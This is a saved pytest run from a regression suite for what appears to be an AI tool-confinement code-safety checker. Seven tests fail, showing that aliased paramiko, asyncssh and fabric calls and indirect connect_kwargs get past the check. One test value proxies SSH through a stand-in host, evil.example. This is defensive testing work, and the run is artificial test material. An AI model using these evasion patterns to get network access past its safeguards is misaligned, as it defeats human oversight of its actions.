FFFFFFF                                                                  [100%]
=================================== FAILURES ===================================
_ test_assigned_apis_require_approval[import paramiko; Factory=paramiko.SSHClient; Factory().connect(hostname='approved.example')] _
/evidence/round6_regressions.py:13: in test_assigned_apis_require_approval
    assert _check_code_safety(code,session_id='round6') is not None
E   assert None is not None
E    +  where None = _check_code_safety("import paramiko; Factory=paramiko.SSHClient; Factory().connect(hostname='approved.example')", session_id='round6')
_ test_assigned_apis_require_approval[import paramiko; Factory=paramiko.SSHClient; c=Factory(); c.connect(hostname='approved.example')] _
/evidence/round6_regressions.py:13: in test_assigned_apis_require_approval
    assert _check_code_safety(code,session_id='round6') is not None
E   assert None is not None
E    +  where None = _check_code_safety("import paramiko; Factory=paramiko.SSHClient; c=Factory(); c.connect(hostname='approved.example')", session_id='round6')
_ test_assigned_apis_require_approval[import asyncssh; fn=asyncssh.connect; fn('approved.example',config=None)] _
/evidence/round6_regressions.py:13: in test_assigned_apis_require_approval
    assert _check_code_safety(code,session_id='round6') is not None
E   assert None is not None
E    +  where None = _check_code_safety("import asyncssh; fn=asyncssh.connect; fn('approved.example',config=None)", session_id='round6')
_ test_assigned_apis_require_approval[import fabric; Factory=fabric.Connection; Factory('approved.example',config=fabric.Config(lazy=True))] _
/evidence/round6_regressions.py:13: in test_assigned_apis_require_approval
    assert _check_code_safety(code,session_id='round6') is not None
E   assert None is not None
E    +  where None = _check_code_safety("import fabric; Factory=fabric.Connection; Factory('approved.example',config=fabric.Config(lazy=True))", session_id='round6')
_ test_fabric_socket_override_requires_block[{'sock': paramiko.ProxyCommand('ssh -F none evil.example -W approved.example:22')}] _
/evidence/round6_regressions.py:25: in test_fabric_socket_override_requires_block
    assert _check_code_safety(code,session_id='round6') is not None
E   assert None is not None
E    +  where None = _check_code_safety("import fabric,paramiko; fabric.Connection('approved.example',config=fabric.Config(lazy=True),connect_kwargs={'sock': paramiko.ProxyCommand('ssh -F none evil.example -W approved.example:22')}).run('true')", session_id='round6')
_____________ test_fabric_socket_override_requires_block[options] ______________
/evidence/round6_regressions.py:25: in test_fabric_socket_override_requires_block
    assert _check_code_safety(code,session_id='round6') is not None
E   assert None is not None
E    +  where None = _check_code_safety("import fabric,paramiko; fabric.Connection('approved.example',config=fabric.Config(lazy=True),connect_kwargs=options).run('true')", session_id='round6')
___________ test_fabric_socket_override_requires_block[{**options}] ____________
/evidence/round6_regressions.py:25: in test_fabric_socket_override_requires_block
    assert _check_code_safety(code,session_id='round6') is not None
E   assert None is not None
E    +  where None = _check_code_safety("import fabric,paramiko; fabric.Connection('approved.example',config=fabric.Config(lazy=True),connect_kwargs={**options}).run('true')", session_id='round6')
=============================== warnings summary ===============================
studio/backend/core/inference/tool_confinement.py:262
  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
    class _PathBeneathAttr(ctypes.Structure):

-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
=========================== short test summary info ============================
FAILED ../evidence/round6_regressions.py::test_assigned_apis_require_approval[import paramiko; Factory=paramiko.SSHClient; Factory().connect(hostname='approved.example')]
FAILED ../evidence/round6_regressions.py::test_assigned_apis_require_approval[import paramiko; Factory=paramiko.SSHClient; c=Factory(); c.connect(hostname='approved.example')]
FAILED ../evidence/round6_regressions.py::test_assigned_apis_require_approval[import asyncssh; fn=asyncssh.connect; fn('approved.example',config=None)]
FAILED ../evidence/round6_regressions.py::test_assigned_apis_require_approval[import fabric; Factory=fabric.Connection; Factory('approved.example',config=fabric.Config(lazy=True))]
FAILED ../evidence/round6_regressions.py::test_fabric_socket_override_requires_block[{'sock': paramiko.ProxyCommand('ssh -F none evil.example -W approved.example:22')}]
FAILED ../evidence/round6_regressions.py::test_fabric_socket_override_requires_block[options]
FAILED ../evidence/round6_regressions.py::test_fabric_socket_override_requires_block[{**options}]
7 failed, 1 warning in 0.12s
